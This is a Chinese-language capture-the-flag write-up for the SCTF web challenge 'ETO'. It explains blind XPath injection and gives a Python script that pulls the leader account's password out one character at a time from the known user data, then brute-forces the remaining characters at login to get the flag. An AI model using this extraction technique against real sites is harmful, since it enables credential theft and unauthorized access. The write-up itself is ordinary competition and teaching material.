# ETO

`score: 200` `Type: web`

## 题目

### 题目信息

这天，暮雨又在天台山上飚车。当一辆又一辆车被他甩的不见踪影时，他不禁想难道我的车技已没人能超越了？看来在地球上想找到对手已经很难了，三体文明的出现，能不能让我有所突破？ 一想到这个可能性暮雨便激动起来，但他没法直接联系到三体人。不过听说最近eto弄了个网站，暮雨想起了自己不仅有的是车技还有...... http://eto.sctf.xctf.org.cn/

### 描述

给了一个可以登录的网站，同时给了5个网站用户的用户名、email、权限

![](/img/eto-1.png)

### 知识点

[xpath注入](http://netsecurity.51cto.com/art/201401/427521.htm)

## 题解

### 测试

分别使用以下几句确认是xpath注入，以及确认了存在user,password字段,确认YeWenjie的密码是32位

```
import requests
url = "http://eto.sctf.xctf.org.cn/index.php"
# 判断user字段是否存在
r = requests.get(url, "action=user&id=1 and count(//user)=5")
print r.text
# 判断password字段是否存在
r = requests.get(url, "action=user&id=1 and count(//user/password)=5")
print r.text
# 判断password字段长度
r = requests.get(url, "action=user&id=1 and string-length(//user/password)=32")
print r.text
```

### 分析

现在的思路有

* 爆破密码,登录后台
* 根据xpath,一位一位得确认密码

题目提示，利用存在的字符。

我们发现，题目的用户信息中覆盖了不少字符，于是利用这些可以获得的字符去测试密码是否正确，主要利用的语句为

```
http://eto.sctf.xctf.org.cn/index.php?action=user&id=1 and substring(//user/password,i,1) = substring(//user/user[1]/username,1,1)
```

如果网页仍然正确返回，说明后面的表达式成立，依此可以确定密码

### py

```
# -*- coding: cp936 -*-
import requests

def sbox_product():
    sbox = {}

    user1 = ['YeWenjie', 'ye@eto.org', 'leader']
    user2 = ['Evans', 'evans@eto.org', 'public']
    user3 = ['Decoder_One', 'one@eto.org', 'public']
    user4 = ['Decoder_Two', 'two@eto.org', 'public']
    user5 = ['Decoder_Three', 'three@eto.org', 'public']

    user = [user1, user2, user3, user4, user5]

    for i in range(len(user)):
        for j in range(len(user[i])):
            for k in range(len(user[i][j])):
                sbox[user[i][j][k]] = {'user': str(i+1), 'infoType': j, 'index': str(k+1)}

    return sbox

# firstStep: 确定字符
def bruteTheChar():
    flag = 0
    for  i in range(32):
        substring1 = ' or substring(//user[1]/password,' + str(i+1) + ',1)='
        for key, value in sbox.items():
            substring2 = 'substring(//user[' + value['user'] + ']/' +  infoType[value['infoType']] + ',' + value['index'] + ',1)'
            r = requests.get(url, 'action=user&id=6'+substring1+substring2)
            print r.url
            if r.text.find('YeWenjie') != -1:
                print r.text
                password.append(key)
                flag = 1
                break
        print ''.join(password)
        if flag:
            flag = 0
            continue
        password.append('?')
    return password

# secondStep: 确定数字
def bruteTheNum(password):
    flag = 0
    password2 = ''.join(password)
    index = password.index('?')+1
    while index:
        substring1 = ' or substring(//user[1]/password,' + str(index) + ',1)='    
        for i in range(10):
            substring2 = str(i)
            r = requests.get(url, 'action=user&id=6'+substring1+substring2)
            print r.url
            if r.text.find('YeWenjie') != -1:
                print r.text
                password[index-1]= str(i)
                flag = 1
                break
        print ''.join(password)
        if password2.find('?', index) != -1:
            index = password.index('?', index)+1
        else:
            break
        if flag:
            flag = 0
            continue
    password2 = ''.join(password)
    return password2

# thirdStep: 仍然确定不了的，爆破
def bruteUnkownChar(password):
    for i in range(128):
        password2 = password.replace('?', chr(i))
        print password2
        data = {'username': 'YeWenjie', 'password': password2}
        r = requests.post(url, data=data)
        if r.text.find('incorrect') != -1:
            print 'Password is incorrect!_' + str(i)
        else:
            index = r.text.find('SCTF{')
            index2 = r.text.find('}',index)
            print r.text[index:index2+1]
            break

if __name__ == '__main__':
    # sbox, 产生已知字符字典
    sbox = sbox_product()
    infoType = ['username', 'email', 'role']

    # url params
    url = "http://eto.sctf.xctf.org.cn/index.php"
    p = {'action': 'user', 'id': '6'}
    password = []


    # 判断user字段是否存在
    # r = requests.get(url, "action=user&id=1 and count(//user)=5")
    # 判断password字段是否存在
    # r = requests.get(url, "action=user&id=1 and count(//user/password)=5")
    # 判断password字段长度
    # r = requests.get(url, "action=user&id=1 and string-length(//user/password)=32")

    # print bruteTheChar()
    password = ['Y', 'w', 'j', '@', '?', '?', '?', '?', '.', 'd', '_', 'g', 'T', 'o', 'W', 'D', '?', 'c', 'e', 'u', '.', 'E', 'a', 'l', 'i', '?', 's', '?', 'y', 'a', 'r', 'n']
    # print bruteTheNum(password)
    password2 = "Ywj@4791.d_gToWD?ceu.Eali0s2yarn"

    flag = bruteUnkownChar(password2)
    # password3 = "Ywj@4791.d_gToWDmceu.Eali0s2yarn"

```
